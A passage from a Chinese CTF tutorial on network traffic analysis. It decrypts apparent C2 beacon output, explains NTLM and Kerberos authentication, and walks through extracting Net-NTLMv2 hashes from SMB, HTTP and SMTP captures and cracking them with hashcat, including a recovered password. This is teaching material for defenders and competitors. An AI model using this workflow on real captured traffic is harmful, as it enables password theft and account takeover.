class="hljs-string">&quot;sha256&quot;</span>).digest()[:<span class="hljs-number">16</span>] != signature:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;message authentication failed&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)<br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    SHARED_KEY = binascii.unhexlify(<span class="hljs-string">&quot;9fe14473479a283821241e2af78017e8&quot;</span>)<br>    HMAC_KEY = binascii.unhexlify(<span class="hljs-string">&quot;1e3d54f1b9f0e106773a59b7c379a89d&quot;</span>)<br>    encrypt_datas = [<span class="hljs-string">&quot;00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3&quot;</span>,<span class="hljs-string">&quot;000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0&quot;</span>,<span class="hljs-string">&quot;000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a&quot;</span>,<span class="hljs-string">&quot;00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4&quot;</span>]<br>    <span class="hljs-keyword">for</span> encrypt_data <span class="hljs-keyword">in</span> encrypt_datas:<br>        <span class="hljs-comment"># encrypt_data = base64.b64decode(encrypt_data)</span><br>        encrypt_data = <span class="hljs-built_in">bytes</span>.fromhex(encrypt_data)<br>        encrypt_data_length = <span class="hljs-built_in">int</span>.from_bytes(encrypt_data[:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br>        encrypt_data_l = encrypt_data[<span class="hljs-number">4</span>:]<br>        data1 = encrypt_data_l[:encrypt_data_length-<span class="hljs-number">16</span>]<br>        signature = encrypt_data_l[encrypt_data_length-<span class="hljs-number">16</span>:]<br>        iv_bytes = <span class="hljs-string">b&quot;abcdefghijklmnop&quot;</span><br><br>        dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">80</span>&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] counter: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[:<span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 任务返回长度: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 任务输出类型: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)))<br>        output = dec[<span class="hljs-number">12</span>:<span class="hljs-built_in">int</span>.from_bytes(dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>], byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)].decode(<span class="hljs-string">&#x27;gbk&#x27;</span>,errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(hexdump.hexdump(dec))<br>        <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure>

<p>例题1-2024西湖论剑初赛-cscs</p>
<h2 id="NTLM认证流量分析"><a href="#NTLM认证流量分析" class="headerlink" title="NTLM认证流量分析"></a>NTLM认证流量分析</h2><h3 id="NTLM认证的基本概念"><a href="#NTLM认证的基本概念" class="headerlink" title="NTLM认证的基本概念"></a>NTLM认证的基本概念</h3><h4 id="NTLM-协议概述："><a href="#NTLM-协议概述：" class="headerlink" title="NTLM 协议概述："></a>NTLM 协议概述：</h4><blockquote>
<p>NTLM是一种专用于Windows网络的 挑战&#x2F;响应 认证协议。它本身并非独立协议，其消息必须嵌入在上层协议（如SMB、LDAP、HTTP）中进行传输。这一点与更为灵活的Kerberos协议不同，后者既可嵌入也可作为独立的应用层协议运行。</p>
</blockquote>
<p>NTLM 认证由以下三种消息构成：</p>
<blockquote>
<p>Type1 协商：主要用于确认双方协议版本</p>
<p>Type2 质询：就是 挑战&#x2F;响应 认证机制起作用的范畴</p>
<p>Type3 验证 在质询完成后验证结果</p>
</blockquote>
<h4 id="NTLM-认证的完整流程："><a href="#NTLM-认证的完整流程：" class="headerlink" title="NTLM 认证的完整流程："></a>NTLM 认证的完整流程：</h4><ul>
<li><p>第一步 - 协商：认证始于客户端向服务器发送Type 1协商消息，告知服务器它所支持的NTLM协议版本和一系列功能列表。</p>
</li>
<li><p>第二步 - 质询：服务器在收到请求后，会回复一个Type 2质询消息。此消息不仅确认了双方认可的功能列表，其最核心的作用是向客户端发送一个由服务器生成的、一次性的16位随机数，即Challenge（质询）。</p>
</li>
<li><p>第三步 - 响应：客户端收到Challenge后，利用本机存储的对应用户密码的NTLM Hash对其进行加密，生成一个唯一的Response（响应）。随后，客户端将Response、用户名以及Challenge一同封装在Type 3消息中发回服务器。</p>
</li>
<li><p>第四步 - 验证：服务器在拿到Type 3消息后，需要验证Response的有效性。如果用户是本地账户，服务器会用自己的数据完成校验；但如果用户属于域账户，服务器自身没有用户密码的Hash，此时它会通过Netlogon协议与域控制器建立安全通道，将完整的Type 1、Type 2、Type 3消息转发给域控。</p>
</li>
<li><p>（第五步 - 域控裁决）：域控制器作为最终的认证机构，它使用自身数据库中的用户Hash和收到的Challenge，以相同的算法重新计算Response。通过比对计算结果与客户端发来的Response是否一致，域控能够做出最终裁决，并将认证成功与否的结果返回给服务器，从而完成整个认证流程。</p>
</li>
</ul>
<h4 id="Net-NTLM-Hash-与响应类型"><a href="#Net-NTLM-Hash-与响应类型" class="headerlink" title="Net-NTLM Hash 与响应类型"></a>Net-NTLM Hash 与响应类型</h4><p>在NTLM认证的Type 3消息中，客户端可能发送六种不同类型的响应，其演变历程体现了微软在安全性上的不断改进：</p>
<ul>
<li><p>LM响应：最古老的响应类型，由早期客户端使用，安全性极低。</p>
</li>
<li><p>NTLM v1响应：由Windows NT、2000、XP等客户端发送，取代了LM响应。</p>
</li>
<li><p>NTLM v2响应：从Windows NT SP4引入的更安全响应，在现代系统中取代NTLM v1响应。</p>
</li>
<li><p>LM v2响应：NTLMv2协议中用于替代LM响应的版本。</p>
</li>
<li><p>NTLM2会话响应：一种折中方案，在不使用完整NTLMv2认证时，也能增强会话安全性。</p>
</li>
<li><p>匿名响应：用于建立匿名上下文，不进行真正的身份验证。</p>
</li>
</ul>
<p>所有这些响应类型都基于Challenge&#x2F;Response机制，其根本区别在于使用的加密算法和对Challenge的处理方式不同。</p>
<h4 id="Net-NTLM-Hash-的格式"><a href="#Net-NTLM-Hash-的格式" class="headerlink" title="Net-NTLM Hash 的格式"></a>Net-NTLM Hash 的格式</h4><blockquote>
<p>NTLM v1 和 NTLMv2 响应分别对应 Net-NTLM Hash v1 和 Net-NTLM Hash v2</p>
</blockquote>
<ul>
<li><p>Net-NTLM Hash v1：<code>username::hostname:LM response:NTLM response:challenge</code></p>
<p> 状态：已废弃，因存在严重安全缺陷，只要获取到 Net-NTLMv1，即可轻易破解出原始 NTLM Hash，与密码强度无关。</p>
</li>
<li><p>Net-NTLM Hash v2：<code>username::domain:challenge:HMAC-MD5:blob</code></p>
<p>  状态：当前推荐使用的、更安全的版本。</p>
</li>
</ul>
<h4 id="Net-NTLM-Hash-的生成流程"><a href="#Net-NTLM-Hash-的生成流程" class="headerlink" title="Net-NTLM Hash 的生成流程"></a>Net-NTLM Hash 的生成流程</h4><ol>
<li><p>Net-NTLMv1 的生成（两种方法）</p>
<ul>
<li><p>共同前置步骤：</p>
<pre><code class="hljs">  获取用户密码的 NT Hash。
  在 NT Hash 后补 5 个字节的 0，使其变为 21 字节。
  将这 21 字节分成 3 组（每组 7 字节），并将每组 7 比特数据后添加 1 比特 0，构成 3 个 8 字节的 DES 密钥。
</code></pre>
</li>
<li><p>方法一（未协商会话安全）：</p>
<pre><code class="hljs">  使用上面得到的 3 个 DES 密钥，直接对 8 字节的 Server Challenge 进行加密，生成 3 段 8 字节密文，组合成 24 字节的响应。
</code></pre>
</li>
<li><p>方法二（已协商 NTLMv2 会话安全）：</p>
<pre><code class="hljs">  拼接 8 字节的 Server Challenge 和 8 字节的 Client Challenge。
  计算这个 16 字节数据的 MD5 散列值，并取前 8 字节。
  使用前面得到的 3 个 DES 密钥，分别对这个 8 字节数据进行加密，生成 3 段 8 字节密文，组合成 24 字节的响应。
</code></pre>
</li>
</ul>
</li>
<li><p>Net-NTLMv2 的生成</p>
<p> 计算 NTLMv2 Hash：</p>
<pre><code class="hljs"> 将大写用户名（Unicode 编码）与认证目标（Type 3 消息中的 TargetName，如域名，区分大小写）拼接。
 
 以用户的 16 字节 NT Hash 为密钥，使用 HMAC-MD5 算法对上述拼接字符串进行加密，得到 16 字节的 NTLMv2 Hash。
</code></pre>
<p> 构建 Blob：</p>
<pre><code class="hljs"> 一个包含时间戳、客户端挑战、目标信息等数据的结构。
</code></pre>
<p> 计算 NTProofStr：</p>
<pre><code class="hljs"> 将来自 Type 2 消息的 Server Challenge 与步骤 2 构建的 Blob 拼接。
 
 以步骤 1 得到的 NTLMv2 Hash 为密钥，使用 HMAC-MD5 算法对拼接后的数据进行加密，得到 16 字节的 NTProofStr。
</code></pre>
<p> 生成最终 Response：</p>
<pre><code class="hljs"> 将 NTProofStr 和 Blob 拼接起来，形成最终的响应。
</code></pre>
</li>
</ol>
<h4 id="LmCompatibilityLevel（LAN-管理器身份验证级别）"><a href="#LmCompatibilityLevel（LAN-管理器身份验证级别）" class="headerlink" title="LmCompatibilityLevel（LAN 管理器身份验证级别）"></a>LmCompatibilityLevel（LAN 管理器身份验证级别）</h4><blockquote>
<p>这个安全策略决定了客户端在 NTLM 认证中 使用哪种响应类型，以及服务器 接受哪种响应类型。不匹配的设置会导致认证失败。</p>
</blockquote>
<table>
<thead>
<tr>
<th>级别值</th>
<th>客户端行为（发送什么）</th>
<th>服务器行为（接受什么）</th>
</tr>
</thead>
<tbody><tr>
<td>0 - 发送 LM &amp; NTLM 响应</td>
<td>只发送 LM 和 NTLMv1 响应。</td>
<td>接受 LM, NTLM, NTLMv2。</td>
</tr>
<tr>
<td>1 - 使用 NTLMv2 会话安全</td>
<td>发送 LM 和 NTLMv1 响应，但会尝试协商 NTLMv2 会话安全。</td>
<td>接受 LM, NTLM, NTLMv2。</td>
</tr>
<tr>
<td>2 - 仅发送 NTLM 响应</td>
<td>只发送 NTLMv1 响应。</td>
<td>接受 LM, NTLM, NTLMv2。</td>
</tr>
<tr>
<td>3 - 仅发送 NTLMv2 响应</td>
<td>只发送 NTLMv2 和 LMv2 响应。</td>
<td>接受 LM, NTLM, NTLMv2。</td>
</tr>
<tr>
<td>4 - 仅发送 NTLMv2&#x2F;拒绝 LM</td>
<td>只发送 NTLMv2 和 LMv2 响应。</td>
<td>拒绝 LM，只接受 NTLM 和 NTLMv2。</td>
</tr>
<tr>
<td>5 - 仅发送 NTLMv2&#x2F;拒绝 LM &amp; NTLM</td>
<td>只发送 NTLMv2 和 LMv2 响应。</td>
<td>拒绝 LM 和 NTLM，只接受 NTLMv2。</td>
</tr>
</tbody></table>
<p>NTLMv2流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包</p>
<p>可以在Wireshark中用关键字 ntlmssp 过滤，然后在成功认证的流量包的分组详情中提取我们需要的字段</p>
<p>当然也可以用这个<a target="_blank" rel="noopener" href="https://github.com/mlgualtieri/NTLMRawUnHide/blob/master/NTLMRawUnHide.py">开源项目</a>中的脚本自动识别并提取</p>
<p><img src="/imgs/%E5%9B%BE%E7%89%87.webp" srcset="/img/loading.gif" lazyload></p>
<h3 id="NTLMv2-认证的SMB流量"><a href="#NTLMv2-认证的SMB流量" class="headerlink" title="NTLMv2 认证的SMB流量"></a>NTLMv2 认证的SMB流量</h3><blockquote>
<p>1.过滤出ntlmssp的请求包，查看 Session Set Request 并复制NTLMSSP_AUTH包中Security Blob层的User name、Domain name</p>
<p>2.查看NTLMSSP_AUTH包中的NTLM响应，并复制出ntlmv2_response以及ntproofstr3</p>
<p>3.过滤出ntlmssp的请求包，查看Session Set Response 并复制出NTLM Server Challenge的值，通常这个数据包是在NTLM_Auth数据包之前</p>
<p>4.把以上内容按照固定格式组合并保存到hash.txt中</p>
<p><strong>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</strong></p>
<p>这里要注意ntlmv2response的开头就是NTproofstring，因此分开来组合</p>
<p>5.使用hashcat爆破hash值</p>
<p>.\hashcat -a 0 -m 5600 hash.txt .\rockyou.txt</p>
</blockquote>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">username::<span class="hljs-symbol">domain:</span><span class="hljs-title class_">ServerChallenge</span><span class="hljs-symbol">:NTproofstring</span><span class="hljs-symbol">:modifiedntlmv2response</span><br></code></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">administrator:</span>:WIN<span class="hljs-number">2008</span>:<span class="hljs-number">9</span>a<span class="hljs-number">88373</span>dbb<span class="hljs-number">4</span>f<span class="hljs-number">5e36</span>:<span class="hljs-number">4</span>eb<span class="hljs-number">74543</span>b<span class="hljs-number">9962</span>bb<span class="hljs-number">2</span>ca<span class="hljs-number">36e938909</span>bb<span class="hljs-number">930</span>:<span class="hljs-number">0101000000000000</span>d<span class="hljs-number">23</span><span class="hljs-keyword">c</span><span class="hljs-number">83</span>f<span class="hljs-number">972</span>f<span class="hljs-number">7</span>d<span class="hljs-number">9015e866</span>dc<span class="hljs-number">6343</span>b<span class="hljs-number">804400000000020008004800410043004</span>b<span class="hljs-number">000100040044004300040010006800610063006</span>b<span class="hljs-number">002e0063006</span>f<span class="hljs-number">006</span>d<span class="hljs-number">0003001600440043002e006800610063006</span>b<span class="hljs-number">002e0063006</span>f<span class="hljs-number">006</span>d<span class="hljs-number">00050010006800610063006</span>b<span class="hljs-number">002e0063006</span>f<span class="hljs-number">006</span>d<span class="hljs-number">0007000800</span>d<span class="hljs-number">23</span><span class="hljs-keyword">c</span><span class="hljs-number">83</span>f<span class="hljs-number">972</span>f<span class="hljs-number">7</span>d<span class="hljs-number">9010600040002000000080030003000000000000000000000000030000046</span>fc<span class="hljs-number">5</span>f<span class="hljs-number">0</span>d<span class="hljs-number">124</span>bc<span class="hljs-number">9</span>b<span class="hljs-number">99</span>b<span class="hljs-number">5</span>b<span class="hljs-number">560</span><span class="hljs-keyword">c</span><span class="hljs-number">14</span>cd<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">7e217</span>f<span class="hljs-number">08</span>f<span class="hljs-number">22</span>ef<span class="hljs-number">5</span>f<span class="hljs-number">223679</span>ec<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">576230</span>fa<span class="hljs-number">30</span>a<span class="hljs-number">001000000000000000000000000000000000000900240063006900660073002</span>f<span class="hljs-number">003100390032002e003100360038002</span>e<span class="hljs-number">00310036002e0031003000000000000000000000000000</span><br></code></pre></td></tr></table></figure>

<p>最后使用 hashcat 进行爆破</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">5600</span> hash.txt rockyou.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 5600 hash.txt rockyou.txt --show<br>ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#<br></code></pre></td></tr></table></figure>

<h3 id="NTLMv2-认证的HTTP流量"><a href="#NTLMv2-认证的HTTP流量" class="headerlink" title="NTLMv2 认证的HTTP流量"></a>NTLMv2 认证的HTTP流量</h3><p>大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中<br>按照之前的步骤提取出来，然后 hashcat 爆破即可</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">username::<span class="hljs-symbol">domain:</span><span class="hljs-title class_">ServerChallenge</span><span class="hljs-symbol">:NTproofstring</span><span class="hljs-symbol">:modifiedntlmv2response</span><br></code></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">jack:</span>:WIDGETLLC:<span class="hljs-number">2</span>af<span class="hljs-number">71</span>b<span class="hljs-number">5</span>ca<span class="hljs-number">7246268</span>:<span class="hljs-number">2</span>d<span class="hljs-number">1</span>d<span class="hljs-number">24572</span>b<span class="hljs-number">15</span>fe<span class="hljs-number">544043431</span><span class="hljs-keyword">c</span><span class="hljs-number">59965</span>d<span class="hljs-number">30</span>:<span class="hljs-number">0101000000000000040</span>d<span class="hljs-number">962</span>b<span class="hljs-number">02</span>edd<span class="hljs-number">901e6994147</span>d<span class="hljs-number">6</span>a<span class="hljs-number">34</span>af<span class="hljs-number">200000000020012005700490044004700450054004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">004300010008004400430030003100040024005700690064006700650074004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">0043002e0049006</span>e<span class="hljs-number">007400650072006e0061006</span><span class="hljs-keyword">c</span><span class="hljs-number">0003002e0044004300300031002</span>e<span class="hljs-number">005700690064006700650074004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">0043002e0049006</span>e<span class="hljs-number">007400650072006e0061006</span><span class="hljs-keyword">c</span><span class="hljs-number">00050024005700690064006700650074004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">0043002e0049006</span>e<span class="hljs-number">007400650072006e0061006</span><span class="hljs-keyword">c</span><span class="hljs-number">0007000800040</span>d<span class="hljs-number">962</span>b<span class="hljs-number">02</span>edd<span class="hljs-number">90106000400020000000800300030000000000000000000000000300000078</span>cdc<span class="hljs-number">520910762267e40488</span>b<span class="hljs-number">60032835</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>a<span class="hljs-number">37604</span>d<span class="hljs-number">1e9</span>be<span class="hljs-number">3</span>ecee<span class="hljs-number">58802</span>fb<span class="hljs-number">5</span>f<span class="hljs-number">9150</span>a<span class="hljs-number">001000000000000000000000000000000000000900200048005400540050002</span>f<span class="hljs-number">003100390032002e003100360038002</span>e<span class="hljs-number">0030002e0031000000000000000000</span><br></code></pre></td></tr></table></figure>

<h3 id="NTLMv2-认证的STMP流量"><a href="#NTLMv2-认证的STMP流量" class="headerlink" title="NTLMv2 认证的STMP流量"></a>NTLMv2 认证的STMP流量</h3><p>这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：</p>
<p><img src="/imgs/N6.png" srcset="/img/loading.gif" lazyload></p>
<p>后续步骤就和之前一样了，提取信息然后用 hashcat 爆破</p>
<p><strong>NTLMv2 中 NTproofstring 生成过程如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><br>user_name = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;QUICAUTH-CCC123!@#&quot;</span><br>domain_name = <span class="hljs-string">&quot;SecretServer&quot;</span><br><br><span class="hljs-comment"># 使用MD4消息摘要算法得到16字节的 NTLM_HASH</span><br>ntlm_hash = hashlib.new(<span class="hljs-string">&quot;md4&quot;</span>, password.encode(<span class="hljs-string">&quot;utf-16-le&quot;</span>)).digest().<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;NTLM Hash: <span class="hljs-subst">&#123;ntlm_hash&#125;</span>&quot;</span>)<br><br>user_domain_name = user_name.upper().encode(<span class="hljs-string">&quot;utf-16-le&quot;</span>)+domain_name.upper().encode(<span class="hljs-string">&quot;utf-16-le&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;User Domain Data: <span class="hljs-subst">&#123;user_domain_name&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 使用 NTLM_HASH 作为密钥对用户名域名进行MD5加密</span><br>firstHMAC = hmac.new(<span class="hljs-built_in">bytes</span>.fromhex(ntlm_hash), user_domain_name, hashlib.md5).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;First HMAC Result: <span class="hljs-subst">&#123;firstHMAC&#125;</span>&quot;</span>)<br><br>ntlm_authentication_data = <span class="hljs-string">&quot;d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000&quot;</span><br><br>NTproofstring = hmac.new(<span class="hljs-built_in">bytes</span>.fromhex(firstHMAC), <span class="hljs-built_in">bytes</span>.fromhex(ntlm_authentication_data), hashlib.md5).hexdigest()<br><span class="hljs-built_in">print</span>(NTproofstring)<br><br><span class="hljs-comment"># NTLM Hash: 61a26d3fee855453bc125700bc8cf6f2</span><br><span class="hljs-comment"># User Domain Data: b&#x27;A\x00D\x00M\x00I\x00N\x00S\x00E\x00C\x00R\x00E\x00T\x00S\x00E\x00R\x00V\x00E\x00R\x00&#x27;</span><br><span class="hljs-comment"># First HMAC Result: 7d3ce509093fb2b7bcbbe7939fa8ee74</span><br><span class="hljs-comment"># efa243f442b9d683eb1b00a2b1a0c9fc</span><br></code></pre></td></tr></table></figure>

<p>例题1-2024数据安全产业人才积分争夺赛 Strangesystem</p>
<h2 id="kerberos认证流量分析"><a href="#kerberos认证流量分析" class="headerlink" title="kerberos认证流量分析"></a>kerberos认证流量分析</h2><h3 id="kerberos认证的基本概念"><a href="#kerberos认证的基本概念" class="headerlink" title="kerberos认证的基本概念"></a>kerberos认证的基本概念</h3><p>Kerberos 是一种由麻省理工大学提出的网络身份验证协议，其设计目标是通过密钥加密技术为客户端与服务器应用程序提供强身份验证。该协议的认证过程不依赖于主机操作系统的认证机制，也不基于主机地址的信任关系，同时不要求网络中所有主机在物理上的绝对安全，并假设网络数据包可能被任意读取、修改或插入。在此背景下，Kerberos 作为可信任的第三方认证服务，依托传统的密码技术（如共享密钥）来执行身份验证。</p>
<p>在 Kerberos 协议中主要存在三个角色：</p>
<p>一是访问服务的客户端，即用户；</p>
<p>二是提供服务的服务器；</p>
<p>三是密钥分发中心，简称 KDC。</p>
<blockquote>
<p>KDC 通常默认安装在域环境的域控制器上，而客户端和服务器则可以是域内的用户或服务，例如 HTTP 服务或数据库服务。Kerberos 通过 KDC 签发票据来控制客户端是否有权限访问某一服务。</p>
</blockquote>
<h3 id="kerberos认证的完整流程"><a href="#kerberos认证的完整流程" class="headerlink" title="kerberos认证的完整流程"></a>kerberos认证的完整流程</h3><p>第一阶段：用户初始认证与 TGT 获取 (AS Exchange)</p>
<pre><code class="hljs">1. AS-REQ (认证服务请求)

	客户端向密钥分发中心(KDC)的认证服务(AS)发送请求。
	
	客户端将其密码生成的哈希值作为密钥，加密一个当前时间戳，并将此加密后的时间戳作为认证因子发送给 KDC。

2. AS-REP (认证服务回复)

	KDC 从数据库中获取该用户的密码哈希，尝试解密时间戳。如果解密成功且时间戳在允许的时间偏差内，则验证通过。
	
	验证成功后，KDC 会创建一个票据授予票据(TGT)。这个 TGT 中包含一个关键结构——特权属性证书(PAC)，PAC 里记录了用户的安全标识符(SID)和所属组信息。
	
	KDC 使用自己的密钥(KDC Key)加密整个 TGT，然后将其发送回客户端。
	
	客户端收到加密的 TGT，但由于没有 KDC 的密钥，无法解密它，只能安全地保存起来。
</code></pre>
<p>第二阶段：申请访问特定服务的票据 (TGS Exchange)</p>
<pre><code class="hljs">1. TGS-REQ (票据授予服务请求)

	当客户端需要访问某个特定服务（如文件共享、邮箱等）时，它会向 KDC 的票据授予服务(TGS)发起请求。
	
	请求中包含之前获得的 TGT（仍由 KDC 密钥加密）以及一个使用服务名称等信息生成的认证符。

2. TGS-REP (票据授予服务回复)

	KDC 验证 TGT 的有效性（通过解密并检查其有效性）。
	
	关键点：只要 TGT 有效，KDC 就会批准请求，而不会在此阶段判断用户是否有权访问该服务。
	
	KDC 会复制 TGT 中的 PAC 数据，并生成一个针对目标服务的服务票据(Service Ticket)。
	
	KDC 使用目标服务账户的密码哈希作为密钥来加密这个服务票据，然后将其发送给客户端。
</code></pre>
<p>第三阶段：访问服务与最终权限验证 (AP Exchange)</p>
<pre><code class="hljs">1. AP-REQ (应用请求)

	客户端向目标服务程序发起访问请求。
	
	请求中提交之前获得的服务票据（由服务密码哈希加密）以及一个新的认证符。

2. AP-REP (应用回复) &amp; PAC 验证

	服务端使用自身的密码哈希来解密服务票据。如果解密成功，则证明票据是真实的KDC颁发的。
	
	服务端从解密后的票据中提取出 PAC 信息。
	
	为了确定用户的具体访问权限，服务端会将 PAC 发送给 KDC（具体是 KDC 的域控制器），请求查询该用户的最终权限。
	
	KDC 解密 PAC，读取其中的用户 SID 和组信息，再结合该服务资源的访问控制列表(ACL)，进行最终的权限判断。
	
	KDC 将权限判定结果返回给服务端。
	
	服务端根据这个结果决定是批准还是拒绝客户端的访问，从而完成整个认证与授权流程。
</code></pre>
